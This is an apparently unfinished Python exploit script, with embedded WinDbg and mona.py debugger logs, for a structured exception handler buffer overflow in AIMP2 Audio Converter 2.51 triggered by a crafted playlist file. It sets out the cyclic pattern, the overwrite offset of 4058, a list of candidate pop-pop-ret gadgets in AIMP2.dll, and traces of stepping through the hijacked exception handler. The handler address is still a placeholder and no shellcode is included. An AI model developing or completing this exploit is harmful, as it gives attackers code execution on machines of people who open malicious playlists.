#!/usr/bin/env python
# AIMP2 Audio Converter 2.51 exploit by iphelix

header = "[playlist]\nNumberOfEntries=1\n\n"
header+= "File1="

totalsize = 5000
padding = "A" * totalsize
pattern_padding_5000 = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

"""
(1a40.1f34): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files (x86)\AIMP2\AIMP2.dll
eax=08eb0020 ebx=00000000 ecx=00000212 edx=00000c41 esi=08eba3c0 edi=001a0000
eip=00a330c6 esp=0019dbd0 ebp=0019dc8c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
AIMP2!SysutilsWideFormatBuf$qqrpvuipxvuipx14SystemTVarRecxi+0xe2:
00a330c6 f366a5          rep movs word ptr es:[edi],word ptr [esi]
0:000> !exchain
0019fcc8: 00330066
Invalid exception stack at 00460032
0:000> d 0019fcc8
0019fcc8  32 00 46 00 66 00 33 00-46 00 66 00 34 00 46 00  2.F.f.3.F.f.4.F.
0019fcd8  66 00 35 00 46 00 66 00-36 00 46 00 66 00 37 00  f.5.F.f.6.F.f.7.
0019fce8  46 00 66 00 38 00 46 00-66 00 39 00 46 00 67 00  F.f.8.F.f.9.F.g.
0019fcf8  30 00 46 00 67 00 31 00-46 00 67 00 32 00 46 00  0.F.g.1.F.g.2.F.
0019fd08  67 00 33 00 46 00 67 00-34 00 46 00 67 00 35 00  g.3.F.g.4.F.g.5.
0019fd18  46 00 67 00 36 00 46 00-67 00 37 00 46 00 67 00  F.g.6.F.g.7.F.g.
0019fd28  38 00 46 00 67 00 39 00-46 00 68 00 30 00 46 00  8.F.g.9.F.h.0.F.
0019fd38  68 00 31 00 46 00 68 00-32 00 46 00 68 00 33 00  h.1.F.h.2.F.h.3.
0:000> !load pykd.pyd
0:000> !py mona pattern_offset 2Ff3 5000
Hold on...
[+] Command used:
!py mona.py pattern_offset 2Ff3 5000
Looking for 2Ff3 in pattern of 500000 bytes
 - Pattern 2Ff3 found in cyclic pattern at position 4058
Looking for 2Ff3 in pattern of 500000 bytes
 - Pattern 3fF2 not found in cyclic pattern (uppercase) 
Looking for 2Ff3 in pattern of 500000 bytes
 - Pattern 3fF2 not found in cyclic pattern (lowercase) 

[+] This mona.py action took 0:00:00.300000
"""

padding = "A" * 4058
nseh = "BB"
seh = "CC"
rest = "D" * (totalsize - len(padding + nseh + seh))

"""
0:000> !exchain
0019fcc8: *** WARNING: Unable to verify checksum for C:\Program Files (x86)\AIMP2\AIMP2c.exe
AIMP2c+30043 (00430043)
Invalid exception stack at 00420042
0:000> !load pykd.pyd
0:000> !py mona seh -m AIMP2.dll -cp unicode
Hold on...
[+] Command used:
!py mona.py seh -m AIMP2.dll -cp unicode

---------- Mona command started on 2022-08-28 13:17:30 (v2.0, rev 616) ----------
[+] Processing arguments and criteria
    - Pointer access level : X
    - Only querying modules AIMP2.dll
    - Pointer criteria : ['unicode']
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] Querying 1 modules
    - Querying module AIMP2.dll
[+] Setting pointer access level criteria to 'R', to increase search results
    New pointer access level : R
[+] Preparing output file 'seh.txt'
    - (Re)setting logfile seh.txt
[+] Writing results to seh.txt
    - Number of pointers of type 'pop ecx # pop ebp # ret ' : 11 
    - Number of pointers of type 'pop esi # pop ebx # ret ' : 17 
[+] Results : 
0x00a6000e |   0x00a6000e (b+0x0001000e)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a6000e |   0x00a70034 (b+0x00020034)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a700db |   0x00a700db (b+0x000200db)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a80029 |   0x00a80029 (b+0x00030029)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00aa015b |   0x00aa015b (b+0x0005015b)  : pop ecx # pop ebp # ret  | startnull,unicode possible ansi transform(s) : 00aa008C->00aa0152 / 00aa009C->00aa0153 {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00af0036 |   0x00af0036 (b+0x000a0036)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00b0004f |   0x00b0004f (b+0x000b004f)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00b000b7 |   0x00b000b7 (b+0x000b00b7)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00b2004b |   0x00b2004b (b+0x000d004b)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00b200d6 |   0x00b200d6 (b+0x000d00d6)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00b3007a |   0x00b3007a (b+0x000e007a)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a6007b |   0x00a6007b (b+0x0001007b)  : pop esi # pop ebx # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a60094 |   0x00a60094 (b+0x00010094)  : pop esi # pop ebx # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a60102 |   0x00a60102 (b+0x00010102)  : pop esi # pop ebx # ret  | startnull,unicode possible ansi transform(s) : 00a6008A->00a60106 {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a6016a |   0x00a6016a (b+0x0001016a)  : pop esi # pop ebx # ret  | startnull,unicode possible ansi transform(s) : 00a6009A->00a60161 {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a80078 |   0x00a80078 (b+0x00030078)  : pop esi # pop ebx # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00a800c0 |   0x00a800c0 (b+0x000300c0)  : pop esi # pop ebx # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00ac2127 |   0x00ac2127 (b+0x00072127)  : pop esi # pop ebx # ret  | startnull,unicode possible ansi transform(s) : 00ac0099->00ac2122 {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00ad02d4 |   0x00ad02d4 (b+0x000802d4)  : pop esi # pop ebx # ret  | startnull,unicode possible ansi transform(s) : 00ad0098->00ad02DC {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
0x00af0070 |   0x00af0070 (b+0x000a0070)  : pop esi # pop ebx # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
... Please wait while I'm processing all remaining results and writing everything to file...
[+] Done. Only the first 20 pointers are shown here. For more pointers, open seh.txt...
    Found a total of 28 pointers

[+] This mona.py action took 0:00:02.538000
"""

padding = "A" * 4058
nseh = "\x42\x6d" # single byte op + nop/align
seh  = "\x00\x00" # pop-pop-ret, obtain from AIMP2.dll but rebase is TRUE somehow so need to keep changing
rest = "D" * (totalsize - len(padding + nseh + seh))

# !load pykd.pyd
# !py mona seh -m aimp2.dll -cp unicode

"""
(18dc.1544): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=08f80020 ebx=00000000 ecx=00000212 edx=00000c41 esi=08f918b8 edi=001a0000
eip=00b430c6 esp=0019dbd0 ebp=0019dc8c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
AIMP2!SysutilsWideFormatBuf$qqrpvuipxvuipx14SystemTVarRecxi+0xe2:
00b430c6 f366a5          rep movs word ptr es:[edi],word ptr [esi]
0:000> !exchain
0019fcc8: AIMP2!SysutilsWideLowerCase$qqrx17SystemWideString+c2 (00b4000e)
Invalid exception stack at 006d0042
0:000> bp 0019fcc8
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a40 esi=00000000 edi=00000000
eip=0019fcc8 esp=0019d5ac ebp=0019d6a0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0019fcc8 42              inc     edx
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fcc9 esp=0019d5ac ebp=0019d6a0 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
0019fcc9 006d00          add     byte ptr [ebp],ch          ss:002b:0019d6a0=05
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fccc esp=0019d5ac ebp=0019d6a0 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
0019fccc 0e              push    cs
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fccd esp=0019d5a8 ebp=0019d6a0 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
0019fccd 00b40044004400  add     byte ptr [eax+eax+440044h],dh ds:002b:00440044=00
0:000> d eip
0019fccd  00 b4 00 44 00 44 00 44-00 44 00 44 00 44 00 44  ...D.D.D.D.D.D.D
0019fcdd  00 44 00 44 00 44 00 44-00 44 00 44 00 44 00 44  .D.D.D.D.D.D.D.D
0019fced  00 44 00 44 00 44 00 44-00 44 00 44 00 44 00 44  .D.D.D.D.D.D.D.D
0019fcfd  00 44 00 44 00 44 00 44-00 44 00 44 00 44 00 44  .D.D.D.D.D.D.D.D
0019fd0d  00 44 00 44 00 44 00 44-00 44 00 44 00 44 00 44  .D.D.D.D.D.D.D.D
0019fd1d  00 44 00 44 00 44 00 44-00 44 00 44 00 44 00 44  .D.D.D.D.D.D.D.D
0019fd2d  00 44 00 44 00 44 00 44-00 44 00 44 00 44 00 44  .D.D.D.D.D.D.D.D
0019fd3d  00 44 00 44 00 44 00 44-00 44 00 44 00 44 00 44  .D.D.D.D.D.D.D.D
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fcd4 esp=0019d5a8 ebp=0019d6a0 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
0019fcd4 44              inc     esp
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fcd5 esp=0019d5a9 ebp=0019d6a0 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
0019fcd5 00440044        add     byte ptr [eax+eax+44h],al  ds:002b:00000044=??
0:000> t
(18dc.1544): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fcd5 esp=0019d5a9 ebp=0019d6a0 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
0019fcd5 00440044        add     byte ptr [eax+eax+44h],al  ds:002b:00000044=??
"""

"""
Realise that if your shellcode has an error during exception handling, it will 
trigger the exception handler, but because our shellcode overwrote the exception handler
our corrupted exception handling shellcode is ran and it goes into an infinite loop 
as you can see below whereby Breakpoint 0 is hit again (breakpoint 0 is the starting
point of our SEH handler code after pop-pop-ret)

0:000> !exchain
0019fcc8: AIMP2!$xp$30Aimp2_id3fileAIMP2_ID3File__4+fd6 (00b3007a)
Invalid exception stack at 006d0042
0:000> bp 0019fcc8
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a40 esi=00000000 edi=00000000
eip=0019fcc8 esp=0019c334 ebp=0019c42c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0019fcc8 42              inc     edx
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fcc9 esp=0019c334 ebp=0019c42c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
0019fcc9 006d00          add     byte ptr [ebp],ch          ss:002b:0019c42c=05
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fccc esp=0019c334 ebp=0019c42c iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
0019fccc b700            mov     bh,0
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fcce esp=0019c334 ebp=0019c42c iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
0019fcce ac              lods    byte ptr [esi]             ds:002b:00000000=??
0:000> t
(229c.39f0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fcce esp=0019c334 ebp=0019c42c iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010282
0019fcce ac              lods    byte ptr [esi]             ds:002b:00000000=??
0:000> t
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a40 esi=00000000 edi=00000000
eip=0019fcc8 esp=0019bd0c ebp=0019be04 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0019fcc8 42              inc     edx
0:000> t
eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fcc9 esp=0019c334 ebp=0019c42c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
0019fcc9 006d00          add     byte ptr [ebp],ch          ss:002b:0019c42c=05
0:000> t
